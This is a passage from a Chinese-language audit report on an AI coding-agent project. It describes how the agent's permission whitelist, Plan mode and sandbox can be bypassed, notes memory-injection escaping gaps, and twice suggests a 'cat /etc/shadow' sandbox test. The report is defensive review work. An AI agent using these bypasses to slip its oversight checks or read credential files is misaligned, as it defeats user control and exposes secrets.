**真 E2E**：`server/tests/e2e.rs` 是**真起 `minicoding-server` 二进制 + 真 HTTP/SSE + wiremock**（`e2e.rs:43` `CARGO_BIN_EXE_`），真实 LLM 经 `MINICODING_E2E_REAL` env 门控（CI 默认不走外网）。但**只有 4 个测试、21 个断言** —— 框架扎实，场景数严重不足。

**LLM provider 确实打了 wiremock**（5 处引用），不是只测 happy path。

### 14.2 测试缺陷

**【P1】`capability_matrix_server_matches_sdk_assembly()` 恒真**（R10-05，§3.4 已详述）

**【P2】真空/近真空测试 27 处（1.7%）**，集中在 3 处：
- `core/src/metrics.rs:340-386` —— **8 个测试里 7 个**是"调一下函数不 panic"；`record_duration_calculates_ms`(:377) 名字承诺计算 ms，实际零断言（注释自承"本测试只验证 record_elapsed 不 panic"）。
- `sandbox/src/driver.rs:184,192` —— 两个沙箱测试均 `let _ = driver.apply(...)` 丢弃结果。
- `sandbox/src/linux.rs:439,457`、`hardening.rs:385` 同类。

**沙箱的"不 panic"测试尤其危险**——沙箱是本项目的核心安全卖点，而它的测试只验证"调用不崩溃"，不验证"隔离是否生效"。理想情况下应有真实的能力验证测试（如：在沙箱中执行 `cat /etc/shadow`，断言失败）。

**【P2】属性测试仅 3 处**：`proptest!` 全仓 3 次。对于"命令解析""路径规范化""patch 解析"这类**输入空间巨大且安全关键**的纯函数，属性测试的价值极高。R9 补的 `policy` shell 黑名单 proptest 是好开始，但覆盖面太窄。

**建议**：优先为以下三个纯函数加 proptest —— `tokenize_command`（命令解析）、`resolve_under`/`is_under`（路径规范化）、`validate_patch_paths`（patch 解析）。这三处正是本次审查发现绕过的地方（R10-01、§5.5），而属性测试恰好是发现这类问题的最佳工具。

**【P2】覆盖率门禁豁免了 22.9% 的非测试代码**：`ci.yml:119` `--exclude minicoding-tui --exclude minicoding-cli --exclude minicoding-server --exclude minicoding-desktop --fail-under-lines 80`。被豁免的 crate 非测试代码合计 **13,500 / 58,944 = 22.9%**，其中 server（6,905 行）是全仓第二大 crate。另 `ci.yml:110` `cargo llvm-cov ... || true` 是显式软门（虽标注为"仅可见性"）。

**【P3】无 `--no-fail-fast`**：745 个 `#[tokio::test]`，首个失败即停，掩盖后续失败。

**【P3】定时依赖测试**：`hooks/src/async_rewake.rs:326` `sleep(10s)`、`:350/357` `sleep(5s)`；`server/tests/e2e.rs:658` `sleep(3s)`。`start_paused` 虚拟时钟确实用了 40 次（好实践），但仍有真实长等待。

### 14.3 CI / CD

**值得肯定 —— CI 门禁没有实质性放水**：
- 全文件 **0 处 `continue-on-error`**，0 处削弱性 `if: always()`。
- 11 个 job：fmt / clippy `-D warnings` / test / coverage≥80% / audit / deny / typos / 跨平台（macOS+Windows，fail-fast:false）/ **windows-msvc 交叉 check** / web（oxlint+tsc+vitest+build+DTO 漂移门禁）/ desktop。
- `dtolnay/rust-toolchain` 已 **SHA 钉版**。
- **罕见的好设计**：`ci.yml:214-241` 的 `windows-target-check` 用 `cargo xwin check --target x86_64-pc-windows-msvc` **在 Linux 上交叉检查 Windows 平台分支**。ci.yml:197-201 的注释说明了起因："两次发布 CI 失败根因相同：windows-sys FFI 只在真实 Windows runner 才被编译"。**这是从失败中学到的真改进**，值得保留。
- pre-commit 与 CI 一致且更严：clippy/deny 在 pre-commit，audit/test/coverage 在 pre-push，另有 `generated-guard`（防 ts-rs 副作用产物误提交）和 `no-secrets-in-staged`。无矛盾。

**缺陷**：
- **【P2】desktop 从未被测试**：`ci.yml:82` 排除，`ci.yml:287-319` 的 desktop job 只有 `cargo build` + `cargo clippy`。`crates/minicoding-desktop/tests/` 存在但从不运行。
- **【P2】桌面产物无更新签名**：`TAURI_SIGN`/`TAURI_KEY`/`updater`/`createUpdaterArtifacts` **全部 0 命中**，只有 checksum。cargo-dist 侧有 `github-attestations = true`（SLSA provenance），但**无 cosign/GPG 二进制签名**。
- **【P2】`deny.toml:20` `unmaintained = "workspace"`** 把 unmaintained 检查限制在 workspace 成员——对 ~500 个传递依赖**完全不检查**。`[bans] multiple-versions = "warn"` 也只是 warn。`advisories.ignore = []` 倒是干净（无 allowlist 的 RUSTSEC）。
- **【P2】许可证合规风险**：`deny.toml` 白名单含 `OpenSSL`（ring）与 `AGPL-3.0-only`。ring 的 OpenSSL 衍生代码与 AGPL 的兼容性存在争议；且 `deny.toml:10` **排除了 desktop/Tauri 依赖树**不做检查。对 AGPL 项目这值得法务确认。
- **【P3】`actions/checkout@v6` 等为浮动大版本**（未 SHA 钉版），与 `dtolnay/rust-toolchain` 的钉版实践不一致。

### 14.4 供应链

**【P2】dependabot 在跑，但 5 周内 0 个被合并**。`origin/dependabot/*` 有 **10 个分支**（htmd-0.5.5、opentelemetry-0.32.0、opentelemetry-otlp-0.32.0、rustyline-18.0.1、rust-minor-patch、actions/checkout-7、setup-node-7、pnpm/action-setup-6、npm-minor-patch 等）。`Cargo.lock` 实测：htmd **0.1.6**、opentelemetry **0.28.0**、rustyline **15.0.0** —— **一个都没升**。升级提议 100% 被搁置。

这不算严重（当前版本未必有漏洞），但意味着"开了 dependabot 却没有处理流程"，比不开更容易造成"以为有防护"的错觉。

### 14.5 版本管理与发布

**【P2】三处版本号漂移**：提交 `5edcaba`（"版本 0.3.9 → 0.3.10"）漏改两处 ——
- `Cargo.toml:35` = `0.3.10` ✓
- `crates/minicoding-web/package.json:3` = **0.3.9** ✗【主审核实】
- `crates/minicoding-desktop/tauri.conf.json:4` = **0.3.9** ✗

tag 共 **45 个**（不是我先前统计的 20），v0.3.10 tag 已存在 → 发版打标流程是通的，只是漏改这两处。

**建议**：加一个 CI 检查（或 pre-commit hook）断言三处版本一致。这是典型的"机器能查、人不该查"的问题。

**【P1】无 LICENSE / CONTRIBUTING / SECURITY / CODE_OF_CONDUCT**（§1.2，已详述）

### 14.6 nightly 依赖 —— 一个需要验证的开放问题

【主审核实】**全仓 `#![feature(` 出现 0 次** —— 代码本身**没有使用任何 nightly-only API**。

`rust-toolchain.toml` 自述的 nightly 理由是：
1. 曾钉住 `nightly-2026-08-18` 以规避 `c656540d` 的 rustc ICE（该 ICE 已在 2026-08-27 的 `e457a7b0d` 修复，故 2026-08-30 解除钉住改回滚动 nightly）；
2. "项目使用 `let chains` 等 2024 edition 语法，1.99 在钉版时刻仍处 nightly/beta"。

但 **edition 2024 与 let-chains 早已在 stable 线稳定化**，而 `rust-version = "1.99"` 远高于该门槛。因此理由 2 的成立性存疑。

**我尝试验证"能否用 stable 构建"但未能完成**：在本环境中 `rustup toolchain install stable` 多次因下载超时中断（stable toolchain 处于 partially-installed 状态）。因此**"项目能否在 stable 上构建"在本轮审查中未能证实，也未能证伪**，列为开放问题。

**为什么这个问题重要**：如果项目实际可以在 stable 上构建，那么 nightly 就是**纯粹的历史包袱**，而对打包者而言 nightly-only 是显著采用障碍（Debian/Fedora/Homebrew 基本不接受 nightly-only 的包）。反之如果确实需要 nightly，应在 README 显著位置说明，并说明对使用者的约束。

**建议（成本低、收益高）**：在 CI 增加一个 `msrv` job：
```yaml
- name: MSRV / stable check
  run: cargo +stable check --workspace --all-targets
```
若通过，则把 `rust-toolchain.toml` 改为 `channel = "stable"` 并移除 nightly 依赖（保留一个 nightly 的 allow-failure job 用于提前发现 ICE）。这会显著改善项目的可打包性与采用门槛。

---

## 15. 文档完备性

### 15.1 规模

| 指标 | 实测 |
|------|------|
| `docs/*.md` 总行数 | **27,061 行** |
| 非测试代码行数 | 58,944 行 |
| **文档 : 代码** | **≈ 1 : 2.2**（比例极高） |
| 既往审查报告（R2–R9b） | 9 份，占 4,780 行 |
| 最大单篇 | `design.md` 3,350 行、`troubleshooting.md` 2,753 行、`product-manual.md` 100KB |
| `AGENTS.md` | 32KB |

### 15.2 完备性：广度优秀，关键缺口明确

**有的**（且质量不错）：architecture / modules / api / data-model / security / hooks / tech-stack / roadmap / dev-plan / features / rules / m9-design / getting-started / build-guide / troubleshooting / product-manual / observability / learning-guide / innovation。

**缺的（均为 P1/P2）**：

| 缺失 | 级别 | 说明 |
|------|------|------|
| **LICENSE 正文** | **P1** | Cargo.toml 与 README 均声明 `AGPL-3.0-only`，但仓库及 git 历史中**从未有过** LICENSE 文件。AGPL 要求随源码分发许可证全文——这是实质性法律缺陷，且恰好发生在一个以"开源可审计"为核心差异化的项目上 |
| **CONTRIBUTING.md** | P2 | 无贡献指南。`AGENTS.md` §0 自述为"项目级 AI 辅助编码约束文件…AI 编码助手必须遵守"，**它不是人类贡献者指南** |
| **SECURITY.md** | P2 | `docs/security.md` 是**设计文档**（架构与威胁分析），**不是漏洞披露流程**。无 `security@example.com`、无披露政策、无支持版本矩阵 |
| **CODE_OF_CONDUCT.md** | P3 | 缺失 |
| **Threat Model / 安全边界声明** | **P1** | 见 §2.4 建议。对以安全为卖点的产品，明确"我们不防什么"比罗列功能更能建立信任 |

### 15.3 准确性：文档漂移是系统性问题

§3.6 已列出 14 条具体漂移。此处补充**根因分析与量化**：

**根因**：`AGENTS.md` §4.1「改代码必改文档」是**人工约定，无机器强制**。对比之下：
- 依赖方向 → `manifest_guard` 强制 ✅
- DTO 契约 → `gen-types` + `git diff --exit-code` 门禁 ✅
- lint 规则 → workspace 级收敛 ✅
- **文档 → 无任何守卫** ❌

**【P2】`docs/roadmap.md:445` 的 sleep 收敛声明与代码差 3 倍**：原文称"33 处真实 sleep 收敛至 **11 处**"，实测非注释 `sleep(` 调用点 **39 处**（其中测试约 32 处）。真实长等待仍存在（`async_rewake.rs:326` sleep(10s) 等）。"11 处"是过时数字。

**建议（高性价比）**：加一个 `tests/doc_guard.rs`（或 xtask），扫描 `docs/*.md` 与 `AGENTS.md` 中的 `crates/.../*.rs` 路径引用，断言文件存在；再扫描文档中出现的 Rust 类型/函数名，断言在代码中存在。以本项目已有的工程纪律（18/18 crate 都有架构守卫测试），这是完全可行且能立刻消灭一大类问题。

### 15.4 `AGENTS.md` 的定位评价

`AGENTS.md` 是一份**高质量的 AI 编码约束文档**：§0 明确区分了"约束运行时被驱动的 LLM"（`docs/rules.md`）与"约束写代码的 AI"（`AGENTS.md`），§2–§8 覆盖编码规范、架构规范、文档更新规范、安全规范、提交规范、AI 行为约束、前端规范。**这个"双约束"设计本身是有价值的创新**（`innovation.md` §11.1 也这么宣称，我认为成立）。

但它带来两个副作用：

1. **它提高了人类贡献者的门槛**。32KB 的规约、大量"AI 助手必须…"的措辞、加上**没有 CONTRIBUTING.md**，外部贡献者基本无从下手。这与"开源可审计"的定位有张力。
2. **它是为 AI 优化的，而 AI 恰恰是最容易让它漂移的一方**。文档漂移（§3.6）与本项目高强度 AI 辅助开发的模式是共生的——AI 生成代码很快，但不会主动回头改文档。

**建议**：把 `AGENTS.md` 中**与人类贡献者相关**的部分（提交规范、分支命名、PR checklist、文档更新义务）抽出为 `CONTRIBUTING.md`，并让 `AGENTS.md` 引用它。这样人类有入口，AI 仍有完整约束。

---

## 16. 设计文档中的设计问题（用户特别要求）

本节专门回应"设计文档中的设计有问题也可以指出"。以下均为**设计层面的价值判断**，而非代码缺陷。

### 16.1 【P1】`innovation.md` §3.4 把 **fail-open** 列为"创新点" —— 安全价值观需要修正

`innovation.md:221` 的章节标题是：

> ### 3.4 NoopDriver 兜底模式（**fail-open 降级**）

并在 §2.1 创新点全景图与 §12.4 对比表中把它作为差异化优势列出。

**问题**：对于一个以"安全可控"为核心卖点的产品，**fail-open 是反模式，不是创新**。`sandbox/src/driver.rs:53-62` 在 landlock 不可用时使用 `NoopDriver` 并继续执行的直接后果，正是本报告的 **R10-03（P0）**——用户以为自己在沙箱里，实际完全裸奔，且只得到一条 `tracing::warn`。

一个安全组件的正确默认值是 **fail-closed**：沙箱不可用 → 拒绝执行（或要求显式 `--allow-unsandboxed`）。"优雅降级"在可用性组件上是优点，在安全组件上是缺陷。

**建议**：
1. 从 `innovation.md` 的创新点列表中**移除** fail-open，改为"可配置的降级策略"，并明确默认 fail-closed、显式 opt-in 才降级。
2. 代码层：把 `NoopDriver` 的启用从"探测失败即启用"改为"探测失败 → 查配置 → 默认拒绝"。
3. 在 `docs/security.md` 显著位置写明："若沙箱不可用，默认行为是拒绝执行；如需在无沙箱环境运行，请显式使用 `--allow-unsandboxed` 并了解风险。"

### 16.2 【P1】`innovation.md` §12 对比矩阵的多项宣称与代码不符

详见 §2.2 的完整复核。归纳为三类问题：

| 类型 | 例子 | 性质 |
|------|------|------|
| **宣称了未实现的能力** | "Windows 受限令牌"（代码中无 `CreateRestrictedToken`）；"seccomp"（默认关、发布不含） | 应删除或标注为计划中 |
| **把能力差距重构为优势** | "10 类 Hook（vs CC 27 类）→ 精简"；"fail-open → 创新" | 叙事技巧，但会误导技术决策者 |
| **过度泛化** | "四形态共享后端"（实际两套 Runtime 装配，Web 缺 5 项能力） | 应改为"共享 crate 与核心 Runtime，前端装配存在差异（见 §3.3）" |

**这不是要否定这份文档**——有对比矩阵本身是好实践。但一份**失真的**对比矩阵比没有更糟：它是技术决策者的主要输入，一旦被发现有夸大，整个项目的可信度都会受损。而本项目的目标用户正是"会去读代码验证的技术决策者"。

### 16.3 【P2】`architecture.md` 的四层模型漏掉 4 个 crate

`architecture.md:20-51` 的四层模型与 §3.5 的映射表只覆盖 14 个 crate，**完全没有** `minicoding-server`（8,460 行，第二大）、`minicoding-protocol`、`minicoding-extension-sdk`、`minicoding-desktop` 的位置。

`architecture.md:288-289` 仍把"Server 模式"与"MCP Server"标注为"**后续**"，而两者均已实现。

**后果**：这份文档给读者的架构心智模型与真实系统**结构性不符**——读者会以为 server 是一个薄适配层，实际上它是第二大 crate 且拥有独立的 Runtime 装配（这正是 R10-18 架构债的根源之一：如果文档把它画清楚了，双轨问题可能更早暴露）。

### 16.4 【P2】`SideEffect` 枚举的建模缺陷 —— 这是 R10-01/02 的共同根因

当前设计：`enum SideEffect { None, FileWrite, Command, Network }`。

它同时承担了**两种语义**，导致冲突：

1. **调度语义**：`None` → 可并行（只读桶）；非 `None` → 串行 + 权限链。
2. **安全语义**：`None` → 无副作用，因此**免检**。

但存在第三类工具，它们**不直接产生副作用，却会派生具备副作用能力的执行体**——`task.spawn`（派生子 Agent，子 Agent 可写可跑 shell）。这类工具被错误地归入 `None`，从而获得了"免检 + 并行"的双重优待。

同理，`plan.exit`（修改全局 Plan 状态）、`ui.ask`（阻塞等待人类输入）也被归入 `None`，分别导致审计盲区（§8.2）与不可限流（§10.2）。

**设计建议**：把 `SideEffect` 拆成两个正交维度：
```rust
struct ToolRisk {
    /// 调度维度：是否可安全并行
    parallel_safe: bool,
    /// 安全维度：是否需要走完整权限链 + Hook + 审计
    requires_authorization: bool,
}
```
或最小改动：增加 `SideEffect::Spawn`（派生执行体）与 `SideEffect::Control`（修改全局状态）两档，两者 `parallel_safe = false`（或 Spawn 可并行但必须授权）、`requires_authorization = true`。

**这个改动能一次性修掉 R10-01（若采用白名单重构）、R10-02、plan.exit 审计盲区三个问题，是本次审查中杠杆率最高的单点修复。**

### 16.5 【P2】权限持久化键的设计缺少作用域维度

`core/policy/persist.rs` 的键为 `tool` 或 `tool@<相对路径前缀>`，落在**全局** `~/.minicoding/policy.toml`。

设计上缺少三个维度：**workdir 作用域**、**时间（创建时间/TTL）**、**可撤销性**。这导致 R10-09（跨项目自动放行）。

**设计建议**：键改为 `<workdir_hash>:<tool>@<path_prefix>`，附加 `created_at`；提供 `minicoding policy list|revoke`；对超过 TTL 的条目自动失效并要求重新确认。

### 16.6 【P3】`core::prelude` 是"看起来好但没人用"的设计

`modules.md:232-236` 把 prelude 定义为"权威导出面"，但全仓零引用（§3.6）。

一个无人使用的导出面不仅无用，而且**必然持续漂移**（因为没有消费者，漂移不会被发现）。要么让下游改用 prelude 并提供 lint 强制，要么删除它并承认"深路径引用"是既有约定。

### 16.7 【P3】`tools` 的"组合层"定位与实现不符 —— 但结果更好

`modules.md` §0.2 把 `tools` 画成依赖 8 个领域 crate 的"组合层"，实际它只依赖 core + policy，通过 `ToolContext` **trait 注入**获得 journal/memory/sandbox 能力（未注入即 no-op）。

**这是文档错、实现对的典型案例**。trait 注入让 tools 的 fan-out 只有 2，避免了依赖黑洞，是**比文档描述更好的设计**。

**建议**：改文档，不要改代码。并在 `modules.md` 中把"trait 注入优于编译期依赖"作为一条明确的架构原则记录下来——这是本项目一个真实且值得推广的设计决策。

---

## 17. 风险登记册

### 17.1 P0（发布前必须修复）

| ID | 风险 | 影响 | 修复要点 |
|----|------|------|---------|
| R10-01 | 只读命令白名单可绕过 | **免确认任意命令执行 / 静默删除 / 越界写入 / 持久化执行原语** | 移除 `env`/`find`；git 白名单校验完整子命令；`cargo check` 移出自动放行；改为基于参数树的白名单 |
| R10-02 | Plan 模式可被 `task.spawn` 绕过 | Plan 模式从硬保证降级为软提示；配合持久化批准可实际写文件/执行命令 | 新增 `SideEffect::Spawn`；子 Agent 传播 `permission_mode` 并取更严者；Plan 下限制子 Agent 类型 |
| R10-03 | 沙箱 fail-open + exec 自动批准 | CI/容器内**完全无隔离执行**；Linux 旧内核裸奔 | `sandbox.fail_closed` 默认 true；沙箱降级弹窗不可走 `AutoApprovePrompter`；修 Windows toolhelp 竞态 |
| R10-04 | Web 形态开箱 401 | **Web 形态实际不可用**，且错误信息为空 | 401 返回可操作 body；前端加 token 输入框；或 server 写 token 文件供本地读取 |

### 17.2 P1（1–2 个迭代内）

| ID | 风险 | 修复要点 |
|----|------|---------|
| R10-05 | 能力漂移守卫恒真 | 测试改为调用真实装配函数；纳入 Hooks/MCP/Extensions 存在性断言 |
| R10-06 | `full-access` 确认死代码 | 三端统一调用 `requires_confirmation()` + `warning_text()` |
| R10-07 | 记忆/AGENTS.md 注入无边界转义 | 抽出 `escape_boundary_tag()`，在所有定界注入点统一调用 |
| R10-08 | 记忆无读取/删除入口 | 加 `memory` 子命令 + `memory.read`/`memory.delete` 工具 |
| R10-09 | 权限持久化无作用域/无过期 | 键加 workdir hash；加 `created_at`/TTL；加 `policy list|revoke` |
| R10-10 | 输出预留 4096 与 64K max_output 脱钩 | `reserved_output` 由 provider capabilities 驱动；紧凑预算下压低 `max_output_tokens` |
| R10-11 | `context_window` 无单一事实来源 | 收敛到一处解析；env 覆盖对所有 provider 生效；启动时 warn 打印来源 |
| R10-12 | `fs.grep`/`git.diff` 不脱敏 | 脱敏下沉到统一输出层 |
| R10-13 | 沙箱覆盖不全（git/MCP/Hook 子进程） | Hook 默认注入沙箱；git/MCP 子进程纳入 |
| R10-14 | **无 LICENSE 文件** | 立即补 AGPL-3.0 全文 |
| R10-15 | CLI feature 门控失效 + 发布产物缺能力 | 用 path 依赖 + `default-features = false`；release 显式指定 features；`--version` 打印能力集 |
| R10-16 | Windows 沙箱非安全边界 | 修正 README/innovation.md 措辞；或实现 `CreateRestrictedToken` |
| R10-17 | seccomp 从未交付 | release 启用并改 allow-list，或从卖点中移除 |
| — | 压缩触发/判据口径不一致致误熔断 | 统一用 `effective_compact_threshold()` |
| — | L2 摘要首消息为 assistant → Anthropic 400 | `repair.rs` 加首消息角色归一化 |
| — | TUI panic 破坏终端 | `catch_unwind` + 强制 `ratatui::restore()` + panic hook |
| — | 无 LICENSE/CONTRIBUTING/SECURITY | 补齐 |

### 17.3 P2（排期修复）

`fs.grep` 无大小上限 · `git.apply` rename 头未校验 · 硬链接绕过 · 沙箱覆盖 git/MCP 子进程 · Seatbelt 反斜杠转义 · `plan.exit` 免检 · `check_file_read` 生产不可达 · 摘要请求自身无预算 · 压缩后已修改文件丢失 · 紧急压缩绕过配对修复 · C-27 关键词启发式 · `auto.index.json` 损坏不自愈 · 目录权限 0755 · 双轨 builder · `AutoApprovePrompter` 恒 Allow · TUI 无 keyring + 错误指引指向不存在参数 · 配置解析静默降级 · `is_local_origin` 只校验 host · 无 ErrorBoundary · Web 无 slash 命令 · 桌面产物无签名 · desktop 从未测试 · 覆盖率豁免 22.9% · dependabot 0 合并 · `unmaintained = "workspace"` · 三处版本漂移 · 文档漂移 · roadmap sleep 数字过时 · 真空测试 27 处 · proptest 仅 3 处 · `MINICODING_CONTEXT_WINDOW` 仅 OpenAI 侧 · `Retry-After` 无上限 · tool_call index 聚合缺陷 · config.toml 接受明文 key · `context_window` 覆盖口缺失（Anthropic/Ollama） · `innovation.md` 把 fail-open 列为创新点（R10-20，安全价值观需修正）

### 17.4 战略风险（非技术）

| 风险 | 说明 | 建议 |
|------|------|------|
| **AGPL 与"可嵌入 SDK"的内在张力** | AGPL 传染性与"嵌入第三方闭源产品"的核心卖点直接冲突，可能是 SDK 零消费者的真实原因 | v0.4 前明确决策：核心改宽松许可 / 商业授权例外 / 放弃第三方嵌入定位 |
| **单人维护 + AI 高velocity** | 373 提交 / 90k 行 / 5 周，全部由 1 人（+AI）。审查带宽未跟上开发带宽是本轮多数问题的根因 | 引入第二个 review 者（人或 AI 交叉审查）；把"守卫有效性"而非"守卫存在性"作为验收标准 |
| **安全叙事与实现的错位** | 核心卖点是安全，而 P0 中 3 个击中安全 | 发布 Threat Model；把"我们不防什么"写清楚 |
| **四形态成本** | 4 套交互 + 2 套装配 + 4 倍一致性成本，当前已产生漂移与守卫失效 | 先合并双轨 builder；Web 修好前标注实验性 |

---

## 18. 改进建议路线图

按**杠杆率**（修复成本 vs 收益）排序，而非按严重度排序。

### 第一梯队：单点修复，收益极大（建议本周）

| # | 动作 | 预计成本 | 收益 |
|---|------|---------|------|
| 1 | **补 LICENSE 全文**（AGPL-3.0） | 5 分钟 | 消除法律缺陷，兑现"开源可审计"的核心宣称 |
| 2 | **`is_harmless_command` 移除 `env`/`find`**；git 白名单校验完整子命令；`cargo check` 移出自动放行 | 1–2 小时 | 堵住 P0 免审执行 |
| 3 | **`task.spawn` 改为新的 `SideEffect::Spawn`**（走完整权限链） | 半天 | 堵住 P0 Plan 模式绕过；顺带修 `plan.exit` 审计盲区 |
| 4 | **TUI `catch_unwind` + 强制 `ratatui::restore()`** | 1 小时 | 消除"panic → 终端不可用" |
| 5 | **`full-access` 接上 `requires_confirmation()`** | 2 小时 | 兑现 README 承诺 |
| 6 | **记忆/`AGENTS.md` 注入统一调用边界转义** | 2 小时 | 复用已有的 `wrap_tool_output` 逻辑 |
| 7 | **`fs.grep`/`git.diff` 接上脱敏** | 2 小时 | 堵住可演示的密钥外泄绕过 |
| 8 | **Web 401 返回可操作 body + 前端 token 输入框** | 半天 | 让 Web 形态真正可用 |

### 第二梯队：结构性修复（建议本迭代）

| # | 动作 | 收益 |
|---|------|------|
| 9 | **合并双轨 builder**：`server` 依赖 `sdk`（已证明无环），删 `runtime_builder.rs`；同时把漂移守卫改为调用真实装配函数 | 消除头号架构债；Web/Desktop 自动获得 Hooks/MCP/Extensions/AutoMemory/子 Agent |
| 10 | **修 CLI feature 门控**（path 依赖 + `default-features = false`）；release 显式指定 features；`--version`/`doctor` 打印已编译能力集 | 让 feature 矩阵真正生效；消除"发布产物缺能力"的静默降级 |
| 11 | **沙箱 fail-closed 默认开**；沙箱降级弹窗不走 `AutoApprovePrompter` | 堵住 P0 |
| 12 | **压缩阈值口径统一**；`reserved_output` 由 capabilities 驱动；`context_window` 收敛到单一出处 | 消除误熔断与真实 400 |
| 13 | **加 `doc_guard` 测试**（扫描文档中的文件路径/类型引用并断言存在） | 一举消灭文档漂移这一大类问题 |
| 14 | **加版本一致性检查**（Cargo.toml / package.json / tauri.conf.json） | 消除三处漂移 |
| 15 | **补 CONTRIBUTING.md + SECURITY.md**；从 `AGENTS.md` 抽出人类相关部分 | 降低贡献门槛 |

### 第三梯队：能力建设（建议下季度）

| # | 动作 | 收益 |
|---|------|------|
| 16 | **为三个安全关键纯函数加 proptest**：`tokenize_command`、`resolve_under`/`is_under`、`validate_patch_paths` | 属性测试是发现本轮这类绕过的最佳工具 |
| 17 | **沙箱能力验证测试**：在沙箱内执行 `cat /etc/shadow` 并断言失败（替代现有的"不 panic"测试） | 让核心安全卖点真正被测试覆盖 |
| 18 | **CI 加 MSRV/stable job**，若通过则脱离 nightly | 显著改善可打包性与采用门槛 |
| 19 | **E2E 场景扩充**（现仅 4 个测试 / 21 断言） | 覆盖真实用户旅程 |
| 20 | **记忆治理界面**（`memory` 子命令 + read/delete 工具） | 补齐用户能力缺口 |
| 21 | **Windows 侧实现 `CreateRestrictedToken`**，或公开承认并修正文档 | 让"三平台"宣称成立，或诚实收敛为"两平台" |
| 22 | **发布 Threat Model / 安全边界声明** | 建立信任；这也是真正的差异化机会 |

---

## 19. 结论

`minicoding-rs` 在 5 周内由一人（高强度 AI 辅助）建成 9 万行 Rust、18 个 crate、四形态前端、40+ 篇文档——**这个产出量本身就是值得尊重的工程成就**。更有价值的是，它没有走"堆功能"的路线，而是在架构纪律上投入了大量精力：依赖方向的 CI 强制、workspace 级 lint 收敛、trait 注入替代编译期依赖、Event Sourcing、L0 约束的代码层强制、以及对自己缺陷的诚实记录习惯（多处 ARCH-x 豁免登记与 R2–R9b 九轮自审）。

**它当前的真实状态是：架构骨架优秀、核心机制扎实、但安全边界与一致性守卫尚未经过同等强度的验证。**

本轮审查发现的 4 个 P0 有一个共同特征——**它们都不是"没做防护"，而是"做了防护但防护本身有洞"**：

- 命令白名单做了，但按首 token 匹配（`env`/`find` 绕过）；
- Plan 模式硬门做了，但 `SideEffect::None` 让它对 `task.spawn` 失效；
- 沙箱做了，但 fail-open 且 exec 模式自动批准降级；
- Web 鉴权做了（还很扎实），但 token 没有传递给前端的通道。

这正是"高 velocity + 单人"模式的典型失效模式：**每个组件单独看都合理，但组件之间的接缝没人验证**。而这个项目的文档与承诺恰恰又把接缝处描述得很完美，进一步掩盖了问题。

**我认为最有价值的下一步不是继续加功能，而是做三件事**：

1. **验证守卫的有效性，而非存在性**。把 `capability_matrix_server_matches_sdk_assembly()` 这类恒真测试找出来（工具：临时在生产代码里注入一个 bug，看测试是否变红——这个"变异测试"方法能快速识别所有假守卫）。这是本轮我最想强调的一条。
2. **修 `SideEffect` 建模**（§16.4）。一个枚举的两处改动能同时修掉 3 个安全问题，是杠杆率最高的单点修复。
3. **发布 Threat Model**。对以安全为卖点的产品，明确"我们不防什么"比继续罗列功能更能建立信任，也是真正能差异化于 Claude Code 的位置。

最后需要说明：本报告指出的所有问题，都发生在**一个 5 周大、v0.3.10、单人开发**的项目上。放在这个语境下，它们更像是"成长中的代价"而非"设计上的失败"。项目已经表现出罕见的自省能力（九轮自审、ARCH-x 豁免登记、对 TOCTOU/Windows 无兜底/seccomp 未启用等缺陷的主动披露）——**这份诚实，是这个项目最有可能走到生产级的理由。**

---

## 附录 A：关键文件索引

| 主题 | 文件 |
|------|------|
| 权限策略与命令白名单 | `crates/minicoding-policy/src/builtin.rs:83,129-190,264-277,864-878` |
| 只读桶（免检路径） | `crates/minicoding-core/src/runtime/rt.rs:1252-1258,1336-1450` |
| 工具分发（无权限检查） | `crates/minicoding-core/src/tool/registry.rs:111-127` |
| 子 Agent 装配 | `crates/minicoding-sdk/src/subagent.rs:168-177,217-234` |
| `task.spawn` side_effect | `crates/minicoding-tools/src/task/spawn.rs:208-210,578-582` |
| 双轨 Runtime | `crates/minicoding-sdk/src/builder.rs` vs `crates/minicoding-server/src/runtime_builder.rs` |
| 恒真守卫测试 | `crates/minicoding-server/tests/architecture.rs:22-85` |
| 沙箱三平台 | `crates/minicoding-sandbox/src/{driver,linux,macos,windows,seccomp,hardening}.rs` |
| 沙箱降级 | `crates/minicoding-core/src/runtime/denial.rs:81`；`crates/minicoding-policy/src/prompter.rs:59-63` |
| 上下文预算 | `crates/minicoding-context/src/budget.rs:26-34`；`manager.rs:428,501-530,589-593,678,706,738-751` |
| 压缩配对保护 | `crates/minicoding-context/src/compress/tool_group.rs`；`repair.rs:265-290` |
| 记忆注入 | `crates/minicoding-memory/src/project_doc/inject.rs:61`；`contributors/project_rules.rs` |
| 边界转义（正确范例） | `crates/minicoding-providers/src/common/mod.rs:63-72` |
| Web 鉴权 | `crates/minicoding-server/src/http.rs:330-345,433-490`；`crates/minicoding-web/src/api/client.ts:50,67` |
| TUI panic | `crates/minicoding-tui/src/main.rs:49-51` |
| 配置静默降级 | `crates/minicoding-core/src/config.rs:395`；`sdk/builder.rs:132`；`server/main.rs:107` |
| CI | `.github/workflows/ci.yml:82,110,119,197-241,270-271,287-319` |
| 定位与对比矩阵 | `docs/innovation.md:221,1265-1330`；`README.md:26` |
| 文档漂移 | `docs/modules.md:35-48,60,85,152-213,232-251,686-710,723,745,754,762-788,791,876`；`docs/architecture.md:20-51,88,105-111,288-289` |

## 附录 B：本次审查未闭环的存疑项

以下项因时间/环境限制未能验证，供后续跟进：

1. **nightly 是否必要**：全仓 `#![feature(` 为 0，但 stable 工具链在本环境多次下载超时，**未能实测 `cargo +stable check` 是否通过**。建议在 CI 加 MSRV job 验证。
2. ~~**MCP 工具的 `side_effect` 来源**~~ —— **【主审二轮已闭环，结论：设计正确，非缺陷】**。
   原担忧：MCP 侧可据 `readOnlyHint` 覆盖 `side_effect()`，若 server 谎报 `readOnlyHint` 即落入只读桶、绕过全部权限链。
   **实测结论：项目已显式防御。** `minicoding-mcp/src/client/wrapper.rs:52-55`：
   ```rust
   let (side_effect, read_only) = match hint {
       // S13/C-25：readOnlyHint 是远端进程的自我声明——仅在用户显式信任该
       ToolHint::ReadOnly if trust_read_only_hint => (SideEffect::None, true),
   ```
   且 `trust_read_only_hint: false` 为默认（`rmcp.rs:87`、`approval.rs:503`）。
   → **未获显式信任的 MCP server 即使声明 `readOnlyHint: true`，仍被映射为 `SideEffect::Command`**（`wrapper.rs:350` 断言），即照常走完整权限链，**不会**落入只读桶。仅当用户显式信任该 server 时才映射为 `SideEffect::None`（`wrapper.rs:362` 断言）。
